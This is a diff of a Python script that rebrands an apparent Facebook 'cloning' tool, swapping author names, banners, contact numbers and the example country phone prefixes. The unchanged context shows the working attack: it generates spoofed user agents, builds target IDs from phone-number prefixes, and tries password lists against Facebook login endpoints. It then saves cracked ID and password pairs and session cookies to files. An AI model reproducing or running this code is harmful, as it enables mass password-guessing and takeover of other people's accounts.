@@ -36,7 +36,7 @@ try:
 		android_models.append(line)
 except:pass
 myid=uuid.uuid4().hex[:5].upper()
- 
+
 usr=[]
 try:
 	xd=requests.get('https://raw.githubusercontent.com/ahmad77412/DATA-FILE/main/UAGNT').text.splitlines()
@@ -60,7 +60,7 @@ ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
- 
+
 for xd in range(10000):
     a='Mozilla/5.0 (Symbian/3; Series60/'
     b=random.randrange(1, 9)
@@ -75,8 +75,8 @@ for xd in range(10000):
     k='Mobile Safari/535.1'
     uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
     ugen2.append(uaku)
- 
- 
+
+
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18'])
     c=' en-us; GT-'
@@ -104,24 +104,20 @@ def uaku():
 			ua.write(un+'\n')
 		ua=open('.bbnew.txt','r').read().splitlines()
 	 
- 
+
 logo=("""\033[1;32m
-\033[1;32m 
- 
- █████╗ ███████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗
-██╔══██╗██╔════╝██╔════╝ ██║  ██║██╔══██╗████╗  ██║
-███████║█████╗  ██║  ███╗███████║███████║██╔██╗ ██║
-██╔══██║██╔══╝  ██║   ██║██╔══██║██╔══██║██║╚██╗██║
-██║  ██║██║     ╚██████╔╝██║  ██║██║  ██║██║ ╚████║
-╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
-                                                   
- 
-      
+\033[1;39m .########...######..##.....##
+\033[1;32m .##.....##.##....##.##.....##
+\033[1;39m .##.....##.##.......##.....##
+\033[1;32m .########...######..#########
+\033[1;39m .##...##.........##.##.....##
+\033[1;32m .##....##..##....##.##.....##
+\033[1;39m .##.....##..######..##.....##
 \033[1;93m--------------------------------------------------
-  \033[1;32mF4C3B00K  : Roohullah Afghan
-  \033[1;32mY0UTUB3   : @RoohullahAfghan
+  \033[1;32mF4C3B00K  : Raziqullah Saadat
+  \033[1;32mY0UTUB3   : @Saadat
   \033[1;32mV3RS10N   : 0.1
-  \033[1;32m0WN3R     : Roohullah Afghan 
+  \033[1;32m0WN3R     : Raziqullah Saadat
 --------------------------------------------------
 \033[1;37m[-]Dear Paid user:
 \033[1;37m[-]Your subscription last date 31/12/23
@@ -171,7 +167,7 @@ id=[]
 tokenku=[]
 try:os.mkdir('data')
 except:pass
- 
+
 def public():
 	usrr=[]
 	try:
@@ -233,7 +229,7 @@ def public():
 		except:
 			ps_limit =1
 		linex()
-		print('\033[1;32m exp: first last,firtslast,first123')
+		print('\033[1;32m exp: Afghan123,khan123,kabul123')
 		linex()
 		for i in range(ps_limit):
 			plist.append(input(f' Put password {i+1}: '))
@@ -533,7 +529,7 @@ def menu():
 		public()
 	elif xd in ['4','04']:
 		clear()
-		print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
+		print(' [1] Afghanistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
 		linex()
 		x=input(' Choose: ')
 		if x in ['1','01']:
@@ -564,7 +560,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;31m Code example: 0306,0315,0335,0345')
+		print('\033[1;31m Code example: 070,077,078,079')
 		code = input('\033[1;32m put code: ')
 		try:
 			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
@@ -606,11 +602,11 @@ def pak():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python AB KHANX.py')
+		os.system('python Raziq.py')
 def bd():
 		user=[]
 		clear()
-		print('\033[1;32m Code example: 016,017,018,019')
+		print('\033[1;32m Code example: 077,070,078,079')
 		code = input('\033[1;32m put code: ')
 		try:
 			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
@@ -643,7 +639,7 @@ def bd():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python AB KHANX.py')
+		os.system('python Raziq.py')
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -716,11 +712,11 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python AB KHANX.py')
- 
+		os.system('python Raziq.py')
+
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [AFG] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;32m [Saadat] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -741,13 +737,13 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [AFGHAN-OK] %s | %s'%(ids,pas))
+				print('\r\r\033[1;32m [Saadat-OK] %s | %s'%(ids,pas))
 				open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m [AFGHAN-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
@@ -758,13 +754,13 @@ def ffb(ids,names,passlist):
 	except requests.exceptions.ConnectionError:
 		time.sleep(20)
 	loop+=1
- 
+
 def rcrack1(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [AFG] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m [Saadat] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -823,12 +819,12 @@ def rcrack1(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [AFGHAN-OK] '+udx+' | '+pas+'\033[1;97m')
+				print('\r\r\033[1;32m [Saadat-OK] '+udx+' | '+pas+'\033[1;97m')
 				open('/sdcard/AFGHAN-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;208m [AFAQ-CP] '+ids+' | '+pas+'\033[1;97m')
+				print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
 				open('/sdcard/AFAQ-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
@@ -844,7 +840,7 @@ def rcrack(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [SW4TI] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m [Saadat] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -872,7 +868,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -882,7 +878,7 @@ def rcrack(ids,passlist):
 					if 'checkpoint' in str(lo):
 						print('\r\r\033[1;34m [AFAQ-TL] '+ids+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [AFGHAN-OK] '+ids+' | '+pas)
+						print(f'\r\x1b[1;32m [Saadat-OK] '+ids+' | '+pas)
 						cek_apk(session,coki)
 						open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
 						oks.append(uid)
@@ -892,7 +888,7 @@ def rcrack(ids,passlist):
 				uid = coki[24:39]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;208m [AFGHAN-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
@@ -903,38 +899,30 @@ def rcrack(ids,passlist):
 		time.sleep(10)
 	except:
 		pass
- 
+
 def menu_apikey():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "_".join(uuid)
   server = requests.get('https://github.com/NSKBRAND/Approval.txt').text
   
  
- 
+
   os.system(" clear")                          
   print("""\033[1;37m
+\033[1;39m .########...######..##.....##
+\033[1;32m .##.....##.##....##.##.....##
+\033[1;39m .##.....##.##.......##.....##
+\033[1;32m .########...######..#########
+\033[1;39m .##...##.........##.##.....##
+\033[1;32m .##....##..##....##.##.....##
+\033[1;39m .##.....##..######..##.....##
     \033[1;32m_______________________________________
-    \033[1;32m     
- █████╗ ███████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗
-██╔══██╗██╔════╝██╔════╝ ██║  ██║██╔══██╗████╗  ██║
-███████║█████╗  ██║  ███╗███████║███████║██╔██╗ ██║
-██╔══██║██╔══╝  ██║   ██║██╔══██║██╔══██║██║╚██╗██║
-██║  ██║██║     ╚██████╔╝██║  ██║██║  ██║██║ ╚████║
-╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
-                                                   
- 
-    \033[1;33m      
-    \033[1;34m    
-    \033[1;35m    
-    
-    \033[1;36m    
-    \033[1;32m_______________________________________
-\033[1;37m[-] AUTHOR    :\033[1;32m Roohullah Afghan
-\033[1;37m[-] GITHUB    :\033[1;32m AFG-Cloner2
-\033[1;37m[-] WhatsApp  :\033[1;32m +923139974897
+\033[1;37m[-] AUTHOR    :\033[1;32m Raziqullah Saadat
+\033[1;37m[-] GITHUB    :\033[1;32m Raziq
+\033[1;37m[-] WhatsApp  :\033[1;32m +93702856593
 \033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
 \033[1;37m[-] VERSION   :\033[1;32m 0.1
-\033[1;37m[-] STATUS    :\033[1;32m PAID
+\033[1;37m[-] STATUS    :\033[1;32m FREE
 ==================================================
 \033[1;33m[*]TOOLS  : Facebook cloning
 \033[1;37m[*]Status : PAID
@@ -956,7 +944,7 @@ def menu_apikey():
  [*] contact with owner
  [0] Exit menu
 ==================================================   """)
- 
+
         
 try:
         menu()
